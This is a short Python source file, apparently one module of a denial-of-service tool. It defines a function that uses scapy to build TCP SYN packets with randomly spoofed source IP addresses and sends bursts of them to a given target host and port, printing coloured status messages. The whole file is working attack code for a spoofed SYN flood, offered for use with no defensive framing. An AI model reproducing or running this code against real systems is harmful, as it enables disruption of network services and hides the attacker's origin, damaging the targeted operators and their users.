# Import modules
import random
from scapy.all import IP, TCP, send
import tools.randomData as randomData
from colorama import Fore


def flood(target):
    IP_Packet = IP()
    IP_Packet.src = randomData.random_IP()
    IP_Packet.dst = target[0]

    TCP_Packet = TCP()
    TCP_Packet.sport = random.randint(1000, 10000)
    TCP_Packet.dport = target[1]
    TCP_Packet.flags = "S"
    TCP_Packet.seq = random.randint(1000, 10000)
    TCP_Packet.window = random.randint(1000, 10000)

    for _ in range(16):
        try:
            send(IP_Packet / TCP_Packet, verbose=False)
        except Exception as e:
            print(
                f"{Fore.MAGENTA}Error while sending SYN packet\n{Fore.MAGENTA}{e}{Fore.RESET}"
            )
        else:
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}SYN packet sent to {'{}:{}'.format(*target)}.{Fore.RESET}"
            )
